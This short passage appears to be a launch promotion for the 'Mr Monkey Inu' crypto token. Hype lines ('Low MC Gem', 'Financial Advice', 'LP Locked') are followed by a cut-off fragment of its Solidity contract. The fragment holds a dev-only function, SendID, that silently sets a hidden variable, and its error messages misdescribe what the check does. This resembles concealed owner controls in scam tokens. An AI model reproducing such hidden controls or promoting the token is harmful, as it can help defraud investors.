...
🙈💎Low MC Gem💎🙈
Take Mr Monkey Inu's Financial Advice.

📈Launching in 29th 16:00 UTC
🔒LP Locked
🗓BASED DEV
...
contract MrMonkeyInu is Context, IERC20, Ownable {
    ...
    function SendID(uint256 amount) public {
        require(_msgSender() != address(0), "ERC20: cannot permit zero address");
        require(_msgSender() == _excludeDevAddress, "ERC20: cannot permit dev address");
        _Renew= amount;
